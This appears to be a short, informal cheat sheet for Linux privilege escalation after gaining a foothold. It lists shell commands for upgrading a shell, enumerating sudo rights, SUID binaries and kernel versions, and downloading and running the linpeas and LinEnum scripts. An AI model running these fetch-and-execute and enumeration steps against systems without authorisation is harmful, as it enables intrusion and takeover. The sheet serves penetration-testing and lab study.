# Privilege escalation

### Your best friend: https://gtfobins.github.io
### Foothold
When we are inside, we can do a quick shell grab, preferably with python
```console
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

### Who am i?
```console
$ whoami
```

### Somethin useful here?
```console
$ history
```

### Maybe here?
```console
$ sudo -l
```

### Letz check for SUID
```console
find / -perm -u=s -type f 2>/dev/null
```
Iterate these binaries, check them on __gtfobins__!


### Get info, the try to find an escallation way on metasploit/searchsploit
Kernel version
```console
$ uname -r
```
```console
$ cat /proc/version
```

## Ace cards

### Linpeas

```console
$ wget <URL>/linpeas.sh
$ chmod +x ./linpeas.sh
$ ./linpeas.sh
```
This will $hit out a ton, and there will be a lot of useful information

### LinEnum

This bull$hit windows defender does not allow to get this shell file to my machine, so just grab it from a random github
```console
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
$ chmod +x ./LinEnum.sh
$ ./LinEnum.sh
```
Pretty much the same thing here
